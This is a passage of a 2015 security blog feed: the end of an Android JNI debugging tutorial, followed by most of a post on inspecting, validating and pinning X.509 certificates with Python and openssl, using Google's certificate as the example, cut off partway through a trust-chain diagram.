#0  Java_com_example_jni_1debug_1demo_SquaredWrapper_squared (je=0x4187fe30, jc=0x7a100019, base=8) at jni/square.c:5
#1  0x418a1750 in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)

Breakpoint 1, Java_com_example_jni_1debug_1demo_SquaredWrapper_squared (je=0x4187fe30, jc=0x7a100019, base=8) at jni/square.c:5
5           return (base*base);
</code></pre></div><p>You can see that the execution currently stopped at <strong>0x60b5bc40</strong>. Now you can inspect the <em>registers</em>, set <em>additional</em> breakpoints, <em>step</em> into routines etc.</p>
<p><img src="/posts/img/2015/android-solib/1c34d2da522b2a450b603cf8cd6a965a.png" alt="GDB GEF">
<img src="/posts/img/2015/android-solib/18d6146e96dbb21ceed498ae1cdd92f4.png" alt="GDB GEF"></p>
<p>At this point you should now be equipped with enough knowledge to dissect shared libraries and get some reverse engineering job done. Although this was a quite easy one due to the fact that we had debug symbols and were able to compile the library, the same techniques should also work on <em>stripped</em> binaries. In the post I&rsquo;ll some <em>binary analysis</em> on some random Android shared library using <a href="http://www.radare.org/r/">radare</a>.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/dorneanu/test/tree/master/jni_debug_demo">jni_debug_demo GitHub Project</a></li>
<li><a href="http://blog.edwards-research.com/2012/04/tutorial-android-jni/">Tutorial: Android JNI</a></li>
<li><a href="http://code.tutsplus.com/tutorials/advanced-android-getting-started-with-the-ndk--mobile-2152">Advanced Android: Getting started with the NDK</a></li>
<li><a href="https://tthtlc.wordpress.com/2012/09/19/how-to-do-remote-debugging-via-gdbserver-running-inside-the-android-phone/">How to do remote debugging via gdbserver running inside the Android phone?</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Validating and pinning X.509 certificates</title>
      <link>https://blog.dornea.nu/2015/05/24/validating-and-pinning-x.509-certificates/</link>
      <pubDate>Sun, 24 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/05/24/validating-and-pinning-x.509-certificates/</guid>
      <content:encoded><![CDATA[<p>In times of NSA, surveillance and data privacy, protecting your data has become an essential part of your every day life. A good understanding of basic principles is half the battle. In this post I just wanted to have look at SSL/TLS from a developer point of view but also from an users one. On the one hand I wanted to use <code>openssl</code> as a CLI utility to <em>inspect</em> and <em>validate</em> <a href="http://en.wikipedia.org/wiki/X.509">X.509 certificates</a>. On the other hand I wanted to have code I could use in my own projects. I&rsquo;ve found <a href="https://github.com/pyca/pyopenssl">pyOpenSSL</a> to be a quite useful library to use on a regular daily basis. Regardless the programming language you&rsquo;ll find pretty generic ways of <em>validating</em> the certificates and <em>pinning</em> the presented data. For the sake of simplicity I&rsquo;ve chosen to analyze <a href="https://www.google.com">Googles</a> SSL certificate. But first let&rsquo;s start with <strong>certificate pinning</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
<span style="color:#999;font-style:italic"># Init ipython notebook stuff</span>
<span style="color:#999;font-style:italic"># Import crypto modules</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">ssl</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">OpenSSL</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">socket</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">json</span>

<span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto.Util</span> <span style="color:#6ab825;font-weight:bold">import</span> asn1
<span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">pprint</span> <span style="color:#6ab825;font-weight:bold">import</span> pprint

<span style="color:#999;font-style:italic"># Import ipython specific modules</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">pandas</span> <span style="color:#6ab825;font-weight:bold">as</span> <span style="color:#447fcf;text-decoration:underline">pd</span>
pd.set_option(<span style="color:#ed9d13">&#39;display.height&#39;</span>, <span style="color:#3677a9">1000</span>)
pd.set_option(<span style="color:#ed9d13">&#39;display.max_rows&#39;</span>, <span style="color:#3677a9">500</span>)
pd.set_option(<span style="color:#ed9d13">&#39;display.max_columns&#39;</span>, <span style="color:#3677a9">500</span>)
pd.set_option(<span style="color:#ed9d13">&#39;display.width&#39;</span>, <span style="color:#3677a9">1000</span>)

%install_ext https://raw.githubusercontent.com/dorneanu/ipython/master/extensions/diagmagic.py
%load_ext diagmagic

%install_ext https://raw.github.com/cjdrake/ipython-magic/master/gvmagic.py
%load_ext gvmagic
</code></pre></div><pre><code>height has been deprecated.

Installed diagmagic.py. To use it, type:
  %load_ext diagmagic
Installed gvmagic.py. To use it, type:
  %load_ext gvmagic
</code></pre>
<h2 id="what-is-it">What is it?</h2>
<p>Having to implement <em>certificate pinning</em> most developers have a poor knowledge about it and the impact it <em>could</em> have on an end-user if not done properly. I think MITM attacks are nowadays widely understood (generally speaking) and developers seem to accept the importance of security measurements against this specific type of attacks. Certificate pinning referrs to the <strong>authenticity</strong> of data and the process of comparing some <em>presented</em> to <em>expected</em> data. Take a look at the <a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning">OWASP site</a> for a more detailed introduction. But first let&rsquo;s have a look how client communicates to a server using a secure (SSL/TLS) channel:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%seqdiag 
// &lt;<span style="color:#a61717;background-color:#e3d2d2">!</span>-- collapse=<span style="color:#6ab825;font-weight:bold">True</span> --&gt;
{
  Client -&gt; Server [label=<span style="color:#ed9d13">&#34;Connect to port 443 ... &#34;</span>];
  Server -&gt; Client [label=<span style="color:#ed9d13">&#34;Send X.509 certificate&#34;</span>];

  // Separator
  === Secure Connection ===

  Client -&gt; Server [label=<span style="color:#ed9d13">&#34;GET /index.html&#34;</span>];
  Server -&gt; Client [label=<span style="color:#ed9d13">&#34;200 OK Success&#34;</span>];
}
</code></pre></div><p><img src="/posts/img/2015/validating-and-pinning-x509-certificates/output_3_0.png" alt="png"></p>
<p>Before establishing the secure connection the client must <strong>validate</strong> the <em>presented</em> certificate.</p>
<blockquote>
<p>Regarding the validation: Here I won&rsquo;t go into much details because this is a quite complicated story from a technical point of view.</p>
</blockquote>
<p>After the successfull validation the <strong>authenticity</strong> of the server is guaranteed - at least that&rsquo;s what the client is assuming. Now let&rsquo;s have a look what happens during a <strong>MITM attack</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%seqdiag 
// &lt;<span style="color:#a61717;background-color:#e3d2d2">!</span>-- collapse=<span style="color:#6ab825;font-weight:bold">True</span> --&gt;
{
  Client -&gt; Eve [label=<span style="color:#ed9d13">&#34;Connect to port 443 ... &#34;</span>];
  Eve -&gt; Server [label=<span style="color:#ed9d13">&#34;Connect to port 443 ...&#34;</span>];

  Server -&gt; Eve [label=<span style="color:#ed9d13">&#34;Send Servers certificate&#34;</span>];
  Eve -&gt; Client [label=<span style="color:#ed9d13">&#34;Send Eves certificate&#34;</span>, color=red];

  // Separator
  === <span style="color:#ed9d13">&#34;Secure&#34;</span> Connection ===

  Client -&gt; Eve [label=<span style="color:#ed9d13">&#34;GET /index.html&#34;</span>];
  Eve -&gt; Server [label=<span style="color:#ed9d13">&#34;GET /index.html&#34;</span>];
  
  Server -&gt; Eve [label=<span style="color:#ed9d13">&#34;200 OK Success&#34;</span>];
  Eve -&gt; Client [label=<span style="color:#ed9d13">&#34;200 OK Success&#34;</span>];
}
</code></pre></div><p><img src="/posts/img/2015/validating-and-pinning-x509-certificates/output_5_0.png" alt="png"></p>
<p>As you see the client is presented <strong>Eves</strong> certificate which is the <em>evil</em> one. Now the client has 2 options:</p>
<ul>
<li>trust the presented certificate and hope it&rsquo;s from the <strong>Server</strong></li>
<li><strong>pin the certificate</strong></li>
</ul>
<p>In the following I&rsquo;ll take a closer look what&rsquo;s inside the certificate and which options one has to do the pinning.</p>
<h2 id="inside-the-certificate">Inside the certificate</h2>
<p>A <a href="http://en.wikipedia.org/wiki/X.509">X.509 certificate</a> usually consists of three main components:</p>
<ol>
<li>the <em>certificate</em> itself</li>
<li>certificate signature <em>algorithm</em></li>
<li>certificate <em>signature</em></li>
</ol>
<p>For the rest of post I&rsquo;ll be analyzing the SSL certificate of <a href="https://www.google.com">www.google.com</a>. Now let&rsquo;s get back to work:</p>
<h4 id="connection-settings">Connection settings</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># Create new SSL context with several security tunings</span>
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)

<span style="color:#999;font-style:italic"># Allow NO SSLv2</span>
ssl_context.options |= ssl.OP_NO_SSLv2

<span style="color:#999;font-style:italic"># Prevent CRIME attacks (OpenSSL 1.0+)</span>
ssl_context.options |= <span style="color:#24909d">getattr</span>(ssl._ssl, <span style="color:#ed9d13">&#34;OP_NO_COMPRESSION&#34;</span>, <span style="color:#3677a9">0</span>)

<span style="color:#999;font-style:italic"># Allow only good ciphers</span>
ssl_context.set_ciphers(<span style="color:#ed9d13">&#39;HIGH:!aNULL:!RC4:!DSS&#39;</span>)

<span style="color:#999;font-style:italic"># Validate the server certificate</span>
ssl_context.verify_mode = ssl.CERT_REQUIRED

<span style="color:#999;font-style:italic"># Check host name</span>
ssl_context.check_hostname = <span style="color:#6ab825;font-weight:bold">True</span>

<span style="color:#999;font-style:italic"># Load CA bundle</span>
<span style="color:#999;font-style:italic"># HINT: This path may differ on your system</span>
ssl_context.load_verify_locations(<span style="color:#ed9d13">&#34;/etc/ssl/certs/ca-certificates.crt&#34;</span>)
</code></pre></div><h4 id="make-connection">Make connection</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># Define target information</span>
target_host = <span style="color:#ed9d13">&#34;www.google.com&#34;</span>
target_port = <span style="color:#3677a9">443</span>

<span style="color:#999;font-style:italic"># Create SSL socket</span>
ssl_socket = ssl_context.wrap_socket(\
                socket.socket(socket.AF_INET, socket.SOCK_STREAM),\
                server_hostname=target_host)
ssl_socket.connect((target_host, target_port))
</code></pre></div><p>Now that we&rsquo;ve established the socket connection, we can fetch the certificate and do the analysis.</p>
<h4 id="fetch-the-certificate">Fetch the certificate</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># Fetch human readable certificate</span>
cert_string = ssl_socket.getpeercert()

<span style="color:#999;font-style:italic"># Fetch certificate in PEM format</span>
cert = ssl.get_server_certificate((target_host, target_port))
</code></pre></div><blockquote>
<p>You don&rsquo;t know nothing about <strong>ASN.1</strong>, <strong>DER</strong> or <strong>PEM</strong>? No problem! Just have a look at this <a href="https://tls.mbed.org/kb/cryptography/asn1-key-structures-in-der-and-pem">great article</a>. But to summarize it:
<em>DER</em> is binary format, its structure is called <em>ASN.1</em>. <em>PEM</em> format is Base64 encoded representation of <em>DER</em>.</p>
</blockquote>
<h5 id="pem-format">PEM format</h5>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#24909d">print</span>(cert)
</code></pre></div><pre><code>-----BEGIN CERTIFICATE-----
MIIEdjCCA16gAwIBAgIIX7v8fExu/5IwDQYJKoZIhvcNAQEFBQAwSTELMAkGA1UE
BhMCVVMxEzARBgNVBAoTCkdvb2dsZSBJbmMxJTAjBgNVBAMTHEdvb2dsZSBJbnRl
cm5ldCBBdXRob3JpdHkgRzIwHhcNMTUwNTA2MTAyOTI1WhcNMTUwODA0MDAwMDAw
WjBoMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEWMBQGA1UEBwwN
TW91bnRhaW4gVmlldzETMBEGA1UECgwKR29vZ2xlIEluYzEXMBUGA1UEAwwOd3d3
Lmdvb2dsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDbQYCq
uMXjaNFVmagkNkToVsTlNpP17Hzps7nJVT+cNcu/bV4mREEG8oRZU1KERHPza3gd
4PmzInZxcMzi90wUoZIQhyMCdCtLDc2cSshJ3TaZM9unjrMzgTT5VhDnoTb72r8W
yqdYvY4wp2cvdfkaLpUirYVYkKww8bMemjXHMzBYHiAdDTLY6sBenM0+t7zfLRTl
t+JTZEx/bK/a7lEkHNFvCn2IW+MYt+668xVYw2TnBhXIJlo0ZrP5Vpa43qIRoykd
4vUVUk3scHyS7XhnDEU/D7IjW6BCWIB4/GrgCMezRTSRPYXufU2aQB9iwAlto7yD
HJW71m3BTUxDaxBnAgMBAAGjggFBMIIBPTAdBgNVHSUEFjAUBggrBgEFBQcDAQYI
KwYBBQUHAwIwGQYDVR0RBBIwEIIOd3d3Lmdvb2dsZS5jb20waAYIKwYBBQUHAQEE
XDBaMCsGCCsGAQUFBzAChh9odHRwOi8vcGtpLmdvb2dsZS5jb20vR0lBRzIuY3J0
MCsGCCsGAQUFBzABhh9odHRwOi8vY2xpZW50czEuZ29vZ2xlLmNvbS9vY3NwMB0G
A1UdDgQWBBSMXZKKlB2MmLIyeqTTdGAZ7y+vRjAMBgNVHRMBAf8EAjAAMB8GA1Ud
IwQYMBaAFErdBhYbvPZotXb1gba7Yhq6WoEvMBcGA1UdIAQQMA4wDAYKKwYBBAHW
eQIFATAwBgNVHR8EKTAnMCWgI6Ahhh9odHRwOi8vcGtpLmdvb2dsZS5jb20vR0lB
RzIuY3JsMA0GCSqGSIb3DQEBBQUAA4IBAQBkJo403MR1GQekBQ5zJCAAcwEuJYn6
oDokSqvR+6Wh6O7L9mBLAkQOkg/uqfGZ8R5KbUSDbnEWl6OboJero8cp9dMnQjck
fZa661zDPoRDWegFm9aZMQLcdnPBi/TI9aEFuUOQLvCk31CrHVFyfSwznBYUZ+Yt
4qxu44/AxEfmLT7p0CF3Y/NvcA2fGRbckj2+3tONI+FTEH/V/SIwRmyXag2/GbPt
RhahlBFXh6VobK8dbFtql6P4+x//7+ze0tXaMRoRsOQfjwWmD6SaA13JJOo8/oBQ
aUYdqnU+Mgkfro7CDpEjOucBzZbsSevm9vPQMhExdju6pKf+nC0bz+7T
-----END CERTIFICATE-----
</code></pre>
<h5 id="text-format">TEXT format</h5>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pprint(cert_string)
</code></pre></div><pre><code>{'OCSP': ('http://clients1.google.com/ocsp',),
 'caIssuers': ('http://pki.google.com/GIAG2.crt',),
 'crlDistributionPoints': ('http://pki.google.com/GIAG2.crl',),
 'issuer': ((('countryName', 'US'),),
            (('organizationName', 'Google Inc'),),
            (('commonName', 'Google Internet Authority G2'),)),
 'notAfter': 'Aug  4 00:00:00 2015 GMT',
 'notBefore': 'May  6 10:29:25 2015 GMT',
 'serialNumber': '5FBBFC7C4C6EFF92',
 'subject': ((('countryName', 'US'),),
             (('stateOrProvinceName', 'California'),),
             (('localityName', 'Mountain View'),),
             (('organizationName', 'Google Inc'),),
             (('commonName', 'www.google.com'),)),
 'subjectAltName': (('DNS', 'www.google.com'),),
 'version': 3}
</code></pre>
<blockquote>
<p>Have a look at <a href="http://www.zytrax.com/tech/survival/ssl.html">this site</a> for great explanations regarding the properties.</p>
</blockquote>
<p>From an attackers perspective generating certificates that contain the same data is easy peasy. So while doing the certificate pinning you shouldn&rsquo;t rely on these values. Furthermore rely on data that can not be manipulated or data that has been generated randomly. Of course there is still a risk with &ldquo;pseudo-random&rdquo; data in case of insecure <a href="http://en.wikipedia.org/wiki/Pseudorandom_number_generator">PRNGs</a>. Or don&rsquo;t you remember this <a href="http://article.gmane.org/gmane.linux.debian.security.announce/1614">one</a> anymore? :)</p>
<h2 id="certificate-pinning">Certificate pinning</h2>
<p>When it comes to pinning you&rsquo;ll have different options what to &ldquo;pin&rdquo; for. Let&rsquo;s have a look how this is done using <em>Python</em>, but the procedure should apply to other programming languages as well. First let&rsquo;s do some conversions and extract data we&rsquo;re interested in.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto.PublicKey</span> <span style="color:#6ab825;font-weight:bold">import</span> RSA
<span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">base64</span> <span style="color:#6ab825;font-weight:bold">import</span> b64decode

<span style="color:#999;font-style:italic"># Convert PEM format to x509 Object</span>
x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)

<span style="color:#999;font-style:italic"># Convert x509 object to ASN1</span>
x509_asn1 = OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_ASN1, x509)

<span style="color:#999;font-style:italic"># Convert x509 object to PEM</span>
x509_pem = OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, x509)

<span style="color:#999;font-style:italic"># Decode the certificate</span>
der = asn1.DerSequence()
der.decode(x509_asn1)

<span style="color:#999;font-style:italic"># Store the components</span>
der_cert = der[<span style="color:#3677a9">0</span>]     <span style="color:#999;font-style:italic"># certificate</span>
der_algo = der[<span style="color:#3677a9">1</span>]     <span style="color:#999;font-style:italic"># signing algorithm</span>
der_sign = der[<span style="color:#3677a9">2</span>]     <span style="color:#999;font-style:italic"># certificate signature</span>

der_sign_in=asn1.DerObject()
der_sign_in.decode(der_sign)
der_sign_payload = der_sign_in.payload
cert_sign = der_sign_payload[<span style="color:#3677a9">1</span>:]

<span style="color:#999;font-style:italic"># Extract the signing certificate algorithm</span>
sign_algo = x509.get_signature_algorithm() 
</code></pre></div><h3 id="pin-the-certificate">Pin the certificate</h3>
<p>You can of course check of the X.509 properties you&rsquo;ve seen before, but you should not rely on these values. Instead use a digest (e.g. SHA-1, SHA-256 etc.) to <strong>fingerprint</strong> the certificate. If the generated fingerprint is exactly the one you have <em>expected</em> then you can trust the certificate. However certificates may change at regular time intervals, so you&rsquo;ll have to adapt your <em>expected</em> fingerprint value every time this happens. Pinning the <em>public key</em> is a much better solution.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># Write x509 (PEM format) to file</span>
f = <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#39;/tmp/pyopenssl/www.google.com.cert.pem&#39;</span>,<span style="color:#ed9d13">&#39;w&#39;</span>)
f.write(x509_pem.decode(<span style="color:#ed9d13">&#34;utf-8&#34;</span>))
f.close()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#999;font-style:italic"># Show certificate fingerprint using openssl</span>
openssl x509 -fingerprint -inform PEM -in  /tmp/pyopenssl/www.google.com.cert.pem -sha256  | grep Fingerprint
</code></pre></div><pre><code>SHA256 Fingerprint=16:3D:A3:9A:7C:8F:4E:C4:79:59:5E:30:A8:82:2C:A7:58:CD:0A:6B:87:EF:7B:43:10:5A:97:C3:93:90:98:D8
</code></pre>
<p>Using this <em>fingerprint</em> you could now verify the authencity of the <em>presented</em> certificate. Besides checking the fingerprint you should check if:</p>
<ul>
<li>the certificate is NULL (this happens when the server has no certificate)</li>
<li>the certificates length &gt; 0</li>
<li>? (did i miss sth?)</li>
</ul>
<h3 id="pin-the-public-key">Pin the public key</h3>
<p>I&rsquo;ll first extract the <strong>public key</strong> from the certificate and print it in a human readable way.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">Crypto.PublicKey</span> <span style="color:#6ab825;font-weight:bold">import</span> RSA

<span style="color:#999;font-style:italic"># Extract the public key</span>
pub_key = x509.get_pubkey()

<span style="color:#999;font-style:italic"># Print the public key in TEXT formatboru</span>
pub_key_text = OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_TEXT, pub_key)

<span style="color:#999;font-style:italic"># Convert to ASN1</span>
pub_key_asn1 = OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, pub_key)

<span style="color:#999;font-style:italic"># Convert key to DER format</span>
pub_der = asn1.DerSequence()
pub_der.decode(pub_key_asn1)

<span style="color:#999;font-style:italic"># Construct RSA key</span>
<span style="color:#999;font-style:italic"># In Python 3 you no longer use &#34;long&#34; -&gt; Use &#34;int&#34; instead</span>
b = RSA.construct((<span style="color:#24909d">int</span>(pub_der._seq[<span style="color:#3677a9">1</span>]), <span style="color:#24909d">int</span>(pub_der._seq[<span style="color:#3677a9">2</span>])))

<span style="color:#999;font-style:italic"># Print public key information</span>
<span style="color:#24909d">print</span>(pub_key_text.decode(<span style="color:#ed9d13">&#34;utf-8&#34;</span>))
</code></pre></div><pre><code>Public-Key: (2048 bit)
Modulus:
    00:db:41:80:aa:b8:c5:e3:68:d1:55:99:a8:24:36:
    44:e8:56:c4:e5:36:93:f5:ec:7c:e9:b3:b9:c9:55:
    3f:9c:35:cb:bf:6d:5e:26:44:41:06:f2:84:59:53:
    52:84:44:73:f3:6b:78:1d:e0:f9:b3:22:76:71:70:
    cc:e2:f7:4c:14:a1:92:10:87:23:02:74:2b:4b:0d:
    cd:9c:4a:c8:49:dd:36:99:33:db:a7:8e:b3:33:81:
    34:f9:56:10:e7:a1:36:fb:da:bf:16:ca:a7:58:bd:
    8e:30:a7:67:2f:75:f9:1a:2e:95:22:ad:85:58:90:
    ac:30:f1:b3:1e:9a:35:c7:33:30:58:1e:20:1d:0d:
    32:d8:ea:c0:5e:9c:cd:3e:b7:bc:df:2d:14:e5:b7:
    e2:53:64:4c:7f:6c:af:da:ee:51:24:1c:d1:6f:0a:
    7d:88:5b:e3:18:b7:ee:ba:f3:15:58:c3:64:e7:06:
    15:c8:26:5a:34:66:b3:f9:56:96:b8:de:a2:11:a3:
    29:1d:e2:f5:15:52:4d:ec:70:7c:92:ed:78:67:0c:
    45:3f:0f:b2:23:5b:a0:42:58:80:78:fc:6a:e0:08:
    c7:b3:45:34:91:3d:85:ee:7d:4d:9a:40:1f:62:c0:
    09:6d:a3:bc:83:1c:95:bb:d6:6d:c1:4d:4c:43:6b:
    10:67
Exponent: 65537 (0x10001)
</code></pre>
<p>Let&rsquo;s check that with <code>openssl</code> output:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
openssl x509 -inform PEM -in /tmp/pyopenssl/www.google.com.cert.pem -pubkey -noout &gt; /tmp/pyopenssl/pubkey.pem
openssl rsa -inform PEM -pubin -in /tmp/pyopenssl/pubkey.pem -modulus 2&gt;1 | grep Modulus
</code></pre></div><pre><code>Modulus=DB4180AAB8C5E368D15599A8243644E856C4E53693F5EC7CE9B3B9C9553F9C35CBBF6D5E26444106F284595352844473F36B781DE0F9B322767170CCE2F74C14A19210872302742B4B0DCD9C4AC849DD369933DBA78EB3338134F95610E7A136FBDABF16CAA758BD8E30A7672F75F91A2E9522AD855890AC30F1B31E9A35C73330581E201D0D32D8EAC05E9CCD3EB7BCDF2D14E5B7E253644C7F6CAFDAEE51241CD16F0A7D885BE318B7EEBAF31558C364E70615C8265A3466B3F95696B8DEA211A3291DE2F515524DEC707C92ED78670C453F0FB2235BA042588078FC6AE008C7B34534913D85EE7D4D9A401F62C0096DA3BC831C95BBD66DC14D4C436B1067
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#999;font-style:italic"># Dump the public key</span>
openssl asn1parse -dump -in /tmp/pyopenssl/pubkey.pem
</code></pre></div><pre><code>    0:d=0  hl=4 l= 290 cons: SEQUENCE          
    4:d=1  hl=2 l=  13 cons: SEQUENCE          
    6:d=2  hl=2 l=   9 prim: OBJECT            :rsaEncryption
   17:d=2  hl=2 l=   0 prim: NULL              
   19:d=1  hl=4 l= 271 prim: BIT STRING        
      0000 - 00 30 82 01 0a 02 82 01-01 00 db 41 80 aa b8 c5   .0.........A....
      0010 - e3 68 d1 55 99 a8 24 36-44 e8 56 c4 e5 36 93 f5   .h.U..$6D.V..6..
      0020 - ec 7c e9 b3 b9 c9 55 3f-9c 35 cb bf 6d 5e 26 44   .|....U?.5..m^&amp;D
      0030 - 41 06 f2 84 59 53 52 84-44 73 f3 6b 78 1d e0 f9   A...YSR.Ds.kx...
      0040 - b3 22 76 71 70 cc e2 f7-4c 14 a1 92 10 87 23 02   .&quot;vqp...L.....#.
      0050 - 74 2b 4b 0d cd 9c 4a c8-49 dd 36 99 33 db a7 8e   t+K...J.I.6.3...
      0060 - b3 33 81 34 f9 56 10 e7-a1 36 fb da bf 16 ca a7   .3.4.V...6......
      0070 - 58 bd 8e 30 a7 67 2f 75-f9 1a 2e 95 22 ad 85 58   X..0.g/u....&quot;..X
      0080 - 90 ac 30 f1 b3 1e 9a 35-c7 33 30 58 1e 20 1d 0d   ..0....5.30X. ..
      0090 - 32 d8 ea c0 5e 9c cd 3e-b7 bc df 2d 14 e5 b7 e2   2...^..&gt;...-....
      00a0 - 53 64 4c 7f 6c af da ee-51 24 1c d1 6f 0a 7d 88   SdL.l...Q$..o.}.
      00b0 - 5b e3 18 b7 ee ba f3 15-58 c3 64 e7 06 15 c8 26   [.......X.d....&amp;
      00c0 - 5a 34 66 b3 f9 56 96 b8-de a2 11 a3 29 1d e2 f5   Z4f..V......)...
      00d0 - 15 52 4d ec 70 7c 92 ed-78 67 0c 45 3f 0f b2 23   .RM.p|..xg.E?..#
      00e0 - 5b a0 42 58 80 78 fc 6a-e0 08 c7 b3 45 34 91 3d   [.BX.x.j....E4.=
      00f0 - 85 ee 7d 4d 9a 40 1f 62-c0 09 6d a3 bc 83 1c 95   ..}M.@.b..m.....
      0100 - bb d6 6d c1 4d 4c 43 6b-10 67 02 03 01 00 01      ..m.MLCk.g.....
</code></pre>
<p>So one could also check the RSA <strong>modulus</strong> against an <em>expected</em> value. Furthermore you could <strong>hash</strong> the whole public key and then check values:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
sha256sum /tmp/pyopenssl/pubkey.pem
</code></pre></div><pre><code>618a8d05fce8d0f8f790e0a2fbaaf739ff7049e7da087520e81a31d0af81513a  /tmp/pyopenssl/pubkey.pem
</code></pre>
<h2 id="validate-certificate">Validate certificate</h2>
<p>Get the <em>trust chain</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
openssl s_client -showcerts -connect www.google.com:443  | grep -e <span style="color:#ed9d13">&#34;s:&#34;</span> -e <span style="color:#ed9d13">&#34;i:&#34;</span>
</code></pre></div><pre><code> 0 s:/C=US/ST=California/L=Mountain View/O=Google Inc/CN=www.google.com
   i:/C=US/O=Google Inc/CN=Google Internet Authority G2
 1 s:/C=US/O=Google Inc/CN=Google Internet Authority G2
   i:/C=US/O=GeoTrust Inc./CN=GeoTrust Global CA
 2 s:/C=US/O=GeoTrust Inc./CN=GeoTrust Global CA
   i:/C=US/O=Equifax/OU=Equifax Secure Certificate Authority


depth=2 C = US, O = GeoTrust Inc., CN = GeoTrust Global CA
verify error:num=20:unable to get local issuer certificate
DONE
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%dot
// &lt;<span style="color:#a61717;background-color:#e3d2d2">!</span>-- collapse=<span style="color:#6ab825;font-weight:bold">True</span> --&gt;
digraph trie {
    rankdir=<span style="color:#ed9d13">&#34;TR&#34;</span>;
    graph [label=<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n\n</span><span style="color:#ed9d13">Chain of trust for www.google.com&#34;</span>];
    node [shape = <span style="color:#ed9d13">&#34;Mrecord&#34;</span>, width=<span style="color:#3677a9">6</span>];
    equifax [label=<span style="color:#ed9d13">&#34;{Subject:  GeoTrust Global CA \l | Issuer: Equifax Secure Certificate Authority \l }&#34;</span>, color=<span style="color:#ed9d13">&#34;grey&#34;</span>];
    geotrust [label=<span style="color:#ed9d13">&#34;{Subject:  Google Internet Authority G2 \l | Issuer: GeoTrust Global CA \l }&#34;</span>, color=<span style="color:#ed9d13">&#34;grey&#34;</span>];
